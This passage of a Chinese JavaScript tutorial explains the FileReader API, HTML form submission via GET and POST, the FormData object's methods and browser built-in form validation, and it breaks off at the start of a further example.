<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;file&quot; onchange=&quot;onChange(event)&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">onChange</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> file = event.<span class="property">target</span>.<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">var</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line">  reader.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">target</span>.<span class="property">result</span>)</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  reader.<span class="title function_">readAsText</span>(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，每当文件控件发生变化，就尝试读取第一个文件。如果读取成功（<code>load</code>事件发生），就打印出文件内容。</p>
<p>FileReader 有以下实例方法。</p>
<ul>
<li>FileReader.abort()：终止读取操作，<code>readyState</code>属性将变成<code>2</code>。</li>
<li>FileReader.readAsArrayBuffer()：以 ArrayBuffer 的格式读取文件，读取完成后<code>result</code>属性将返回一个 ArrayBuffer 实例。</li>
<li>FileReader.readAsBinaryString()：读取完成后，<code>result</code>属性将返回原始的二进制字符串。</li>
<li>FileReader.readAsDataURL()：读取完成后，<code>result</code>属性将返回一个 Data URL 格式（Base64 编码）的字符串，代表文件内容。对于图片文件，这个字符串可以用于<code> &lt;img&gt; </code>元素的<code>src</code>属性。注意，这个字符串不能直接进行 Base64 解码，必须把前缀<code>data:*/*;base64,</code>从字符串里删除以后，再进行解码。</li>
<li>FileReader.readAsText()：读取完成后，<code>result</code>属性将返回文件内容的文本字符串。该方法的第一个参数是代表文件的 Blob 实例，第二个参数是可选的，表示文本编码，默认为 UTF-8。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment">  &lt;input type=&quot;file&quot; onchange=&quot;previewFile()&quot;&gt;</span></span><br><span class="line"><span class="comment">  &lt;img src=&quot;&quot; height=&quot;200&quot;&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">previewFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> preview = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> file    = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;input[type=file]&#x27;</span>).<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">var</span> reader  = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line"></span><br><span class="line">  reader.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    preview.<span class="property">src</span> = reader.<span class="property">result</span>;</span><br><span class="line">  &#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (file) &#123;</span><br><span class="line">    reader.<span class="title function_">readAsDataURL</span>(file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，用户选中图片文件以后，脚本会自动读取文件内容，然后作为一个 Data URL 赋值给<code> &lt;img&gt; </code>元素的<code>src</code>属性，从而把图片展示出来。</p>
<h2 id="十三、表单，FormData-对象"><a href="#十三、表单，FormData-对象" class="headerlink" title="十三、表单，FormData 对象"></a>十三、表单，FormData 对象</h2><h3 id="1、表单概述"><a href="#1、表单概述" class="headerlink" title="1、表单概述"></a>1、表单概述</h3><p>表单（<code>&lt;form&gt;</code>）用来收集用户提交的数据，发送到服务器。比如，用户提交用户名和密码，让服务器验证，就要通过表单。表单提供多种控件，让开发者使用，具体的控件种类和用法请参考 HTML 语言的教程。本章主要介绍 JavaScript 与表单的交互。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/handling-page&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user_name&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;passwd&quot;</span>&gt;</span>密码：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;passwd&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user_passwd&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit_button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码就是一个简单的表单，包含三个控件：用户名输入框、密码输入框和提交按钮。</p>
<p>用户点击“提交”按钮，每一个控件都会生成一个键值对，键名是控件的<code>name</code>属性，键值是控件的<code>value</code>属性，键名和键值之间由等号连接。比如，用户名输入框的<code>name</code>属性是<code>user_name</code>，<code>value</code>属性是用户输入的值，假定是“张三”，提交到服务器的时候，就会生成一个键值对<code>user_name=张三</code>。</p>
<p>所有的键值对都会提交到服务器。但是，提交的数据格式跟<code>&lt;form&gt;</code>元素的<code>method</code>属性有关。该属性指定了提交数据的 HTTP 方法。如果是 GET 方法，所有键值对会以 URL 的查询字符串形式，提交到服务器，比如<code>/handling-page?user_name=张三&amp;user_passwd=123&amp;submit_button=提交</code>。下面就是 GET 请求的 HTTP 头信息。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> /handling-page?user_name=张三&amp;user_passwd=<span class="number">123</span>&amp;submit_button=提交</span><br><span class="line"><span class="title class_">Host</span>: example.<span class="property">com</span></span><br></pre></td></tr></table></figure>

<p>如果是 POST 方法，所有键值对会连接成一行，作为 HTTP 请求的数据体发送到服务器，比如<code>user_name=张三&amp;user_passwd=123&amp;submit_button=提交</code>。下面就是 POST 请求的头信息。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /handling-page <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: example.<span class="property">com</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">74</span></span><br><span class="line"></span><br><span class="line">user_name=张三&amp;user_passwd=<span class="number">123</span>&amp;submit_button=提交</span><br></pre></td></tr></table></figure>

<p>注意，实际提交的时候，只要键值不是 URL 的合法字符（比如汉字“张三”和“提交”），浏览器会自动对其进行编码。</p>
<p>点击<code>submit</code>控件，就可以提交表单。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面表单就包含一个<code>submit</code>控件，点击这个控件，浏览器就会把表单数据向服务器提交。</p>
<p>注意，表单里面的&#96;&#96;元素如果没有用<code>type</code>属性指定类型，那么默认就是<code>submit</code>控件。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面表单的&#96;&#96;元素，点击以后也会提交表单。</p>
<p>除了点击<code>submit</code>控件提交表单，还可以用表单元素的<code>submit()</code>方法，通过脚本提交表单。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">formElement.<span class="title function_">submit</span>();</span><br></pre></td></tr></table></figure>

<p>表单元素的<code>reset()</code>方法可以重置所有控件的值（重置为默认值）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">formElement.<span class="title function_">reset</span>()</span><br></pre></td></tr></table></figure>



<h3 id="2、FormData-对象"><a href="#2、FormData-对象" class="headerlink" title="2、FormData 对象"></a>2、FormData 对象</h3><h4 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h4><p>表单数据以键值对的形式向服务器发送，这个过程是浏览器自动完成的。但是有时候，我们希望通过脚本完成过程，构造和编辑表单键值对，然后通过<code>XMLHttpRequest.send()</code>方法发送。浏览器原生提供了 FormData 对象来完成这项工作。</p>
<p>FormData 首先是一个构造函数，用来生成实例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> formdata = <span class="keyword">new</span> <span class="title class_">FormData</span>(form);</span><br></pre></td></tr></table></figure>

<p><code>FormData()</code>构造函数的参数是一个表单元素，这个参数是可选的。如果省略参数，就表示一个空的表单，否则就会处理表单元素里面的键值对。</p>
<p>下面是一个表单。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;myForm&quot;</span> <span class="attr">name</span>=<span class="string">&quot;myForm&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;useracc&quot;</span>&gt;</span>账号：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;useracc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;useracc&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;userfile&quot;</span>&gt;</span>上传文件：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;userfile&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userfile&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit!&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们用 FormData 对象处理上面这个表单。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myForm = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myForm&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>(myForm);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取某个控件的值</span></span><br><span class="line">formData.<span class="title function_">get</span>(<span class="string">&#x27;username&#x27;</span>) <span class="comment">// &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置某个控件的值</span></span><br><span class="line">formData.<span class="title function_">set</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;张三&#x27;</span>);</span><br><span class="line"></span><br><span class="line">formData.<span class="title function_">get</span>(<span class="string">&#x27;username&#x27;</span>) <span class="comment">// &quot;张三&quot;</span></span><br></pre></td></tr></table></figure>



<h4 id="2-2-实例方法"><a href="#2-2-实例方法" class="headerlink" title="2.2 实例方法"></a>2.2 实例方法</h4><p>FormData 提供以下实例方法。</p>
<ul>
<li><code>FormData.get(key)</code>：获取指定键名对应的键值，参数为键名。如果有多个同名的键值对，则返回第一个键值对的键值。</li>
<li><code>FormData.getAll(key)</code>：返回一个数组，表示指定键名对应的所有键值。如果有多个同名的键值对，数组会包含所有的键值。</li>
<li><code>FormData.set(key, value)</code>：设置指定键名的键值，参数为键名。如果键名不存在，会添加这个键值对，否则会更新指定键名的键值。如果第二个参数是文件，还可以使用第三个参数，表示文件名。</li>
<li><code>FormData.delete(key)</code>：删除一个键值对，参数为键名。</li>
<li><code>FormData.append(key, value)</code>：添加一个键值对。如果键名重复，则会生成两个相同键名的键值对。如果第二个参数是文件，还可以使用第三个参数，表示文件名。</li>
<li><code>FormData.has(key)</code>：返回一个布尔值，表示是否具有该键名的键值对。</li>
<li><code>FormData.keys()</code>：返回一个遍历器对象，用于<code>for...of</code>循环遍历所有的键名。</li>
<li><code>FormData.values()</code>：返回一个遍历器对象，用于<code>for...of</code>循环遍历所有的键值。</li>
<li><code>FormData.entries()</code>：返回一个遍历器对象，用于<code>for...of</code>循环遍历所有的键值对。如果直接用<code>for...of</code>循环遍历 FormData 实例，默认就会调用这个方法。</li>
</ul>
<p>下面是<code>get()</code>、<code>getAll()</code>、<code>set()</code>、<code>append()</code>方法的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line"></span><br><span class="line">formData.<span class="title function_">set</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;张三&#x27;</span>);</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;李四&#x27;</span>);</span><br><span class="line">formData.<span class="title function_">get</span>(<span class="string">&#x27;username&#x27;</span>) <span class="comment">// &quot;张三&quot;</span></span><br><span class="line">formData.<span class="title function_">getAll</span>(<span class="string">&#x27;username&#x27;</span>) <span class="comment">// [&quot;张三&quot;, &quot;李四&quot;]</span></span><br><span class="line"></span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;userpic[]&#x27;</span>, myFileInput.<span class="property">files</span>[<span class="number">0</span>], <span class="string">&#x27;user1.jpg&#x27;</span>);</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;userpic[]&#x27;</span>, myFileInput.<span class="property">files</span>[<span class="number">1</span>], <span class="string">&#x27;user2.jpg&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>下面是遍历器的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;value1&#x27;</span>);</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;key2&#x27;</span>, <span class="string">&#x27;value2&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">of</span> formData.<span class="title function_">keys</span>()) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &quot;key1&quot;</span></span><br><span class="line"><span class="comment">// &quot;key2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> value <span class="keyword">of</span> formData.<span class="title function_">values</span>()) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &quot;value1&quot;</span></span><br><span class="line"><span class="comment">// &quot;value2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> pair <span class="keyword">of</span> formData.<span class="title function_">entries</span>()) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pair[<span class="number">0</span>] + <span class="string">&#x27;: &#x27;</span> + pair[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// key1: value1</span></span><br><span class="line"><span class="comment">// key2: value2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于遍历 formData.entries()</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> pair <span class="keyword">of</span> formData) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pair[<span class="number">0</span>] + <span class="string">&#x27;: &#x27;</span> + pair[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// key1: value1</span></span><br><span class="line"><span class="comment">// key2: value2</span></span><br></pre></td></tr></table></figure>



<h3 id="3、表单的内置验证"><a href="#3、表单的内置验证" class="headerlink" title="3、表单的内置验证"></a>3、表单的内置验证</h3><h4 id="3-1-自动校验"><a href="#3-1-自动校验" class="headerlink" title="3.1 自动校验"></a>3.1 自动校验</h4><p>表单提交的时候，浏览器允许开发者指定一些条件，它会自动验证各个表单控件的值是否符合条件。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 必填 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 必须符合正则表达式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">pattern</span>=<span class="string">&quot;banana|cherry&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 字符串长度必须为6个字符 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">minlength</span>=<span class="string">&quot;6&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;6&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 数值必须在1到10之间 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">min</span>=<span class="string">&quot;1&quot;</span> <span class="attr">max</span>=<span class="string">&quot;10&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 必须填入 Email 地址 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 必须填入 URL --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;URL&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果一个控件通过验证，它就会匹配<code>:valid</code>的 CSS 伪类，浏览器会继续进行表单提交的流程。如果没有通过验证，该控件就会匹配<code>:invalid</code>的 CSS 伪类，浏览器会终止表单提交，并显示一个错误信息。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:invalid</span> &#123;</span><br><span class="line">  <span class="attribute">border-color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span>,</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:valid</span> &#123;</span><br><span class="line">  <span class="attribute">border-color</span>: <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-2-checkValidity"><a href="#3-2-checkValidity" class="headerlink" title="3.2 checkValidity()"></a>3.2 checkValidity()</h4><p>除了提交表单的时候，浏览器自动校验表单，还可以手动触发表单的校验。表单元素和表单控件都有<code>checkValidity()</code>方法，用于手动触发校验。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 触发整个表单的校验</span></span><br><span class="line">form.<span class="title function_">checkValidity</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发单个表单控件的校验</span></span><br><span class="line">formControl.<span class="title function_">checkValidity</span>()</span><br></pre></td></tr></table></figure>

<p><code>checkValidity()</code>方法返回一个布尔值，<code>true</code>表示通过校验，<code>false</code>表示没有通过校验。因此，提交表单可以封装为下面的函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">submitForm</span>(<span class="params">action</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;form&#x27;</span>);</span><br><span class="line">  form.<span class="property">action</span> = action;</span><br><span class="line">  <span class="keyword">if</span> (form.<span class="title function_">checkValidity</span>()) &#123;</span><br><span class="line">    form.<span class="title function_">submit</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-3-willValidate-属性"><a href="#3-3-willValidate-属性" class="headerlink" title="3.3 willValidate 属性"></a>3.3 willValidate 属性</h4><p>控件元素的<code>willValidate</code>属性是一个布尔值，表示该控件是否会在提交时进行校验。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;form novalidate&gt;</span></span><br><span class="line"><span class="comment">//   &lt;input id=&quot;name&quot; name=&quot;name&quot; required /&gt;</span></span><br><span class="line"><span class="comment">// &lt;/form&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#name&#x27;</span>);</span><br><span class="line">input.<span class="property">willValidate</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h4 id="3-4-validationMessage-属性"><a href="#3-4-validationMessage-属性" class="headerlink" title="3.4 validationMessage 属性"></a>3.4 validationMessage 属性</h4><p>控件元素的<code>validationMessage</code>属性返回一个字符串，表示控件不满足校验条件时，浏览器显示的提示文本。以下两种情况，该属性返回空字符串。</p>
<ul>
<li>该控件不会在提交时自动校验</li>
<li>该控件满足校验条件</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;form&gt;&lt;input type=&quot;text&quot; required&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;form input&#x27;</span>).<span class="property">validationMessage</span></span><br><span class="line"><span class="comment">// &quot;请填写此字段。&quot;</span></span><br></pre></td></tr></table></figure>

<p>下面是另一个例子。</p>
